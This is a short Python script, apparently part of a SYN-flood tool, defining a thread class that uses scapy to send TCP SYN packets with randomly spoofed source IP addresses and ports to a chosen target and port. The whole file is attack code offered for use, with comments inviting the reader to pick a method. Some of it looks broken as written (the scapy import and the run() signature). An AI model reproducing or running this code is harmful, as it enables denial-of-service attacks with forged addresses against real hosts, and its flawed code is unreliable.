#!/usr/bin/env python
import logging
import random
import scapy
import threading

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

class sendSYN(threading.Thread):

	def __init__(self):
		threading.Thread.__init__(self)

	def run(self,target,port):
		# There are two different ways you can go about pulling this off.
		# You can either:
		#   - 1. Just open a socket to your target on any old port
		#   - 2. Or you can be a cool kid and use scapy to make it look cool, and overcomplicated!
		#
		# (Uncomment whichever method you'd like to use)

		# Method 1 -
#		s = socket.socket()
#		s.connect((target,port))

	        #Methods 2 -
		i = scapy.IP()
		i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
		i.dst = target

		t = scapy.TCP()
		t.sport = random.randint(1,65535)
		t.dport = port
		t.flags = 'S'

		scapy.send(i/t, verbose=0)
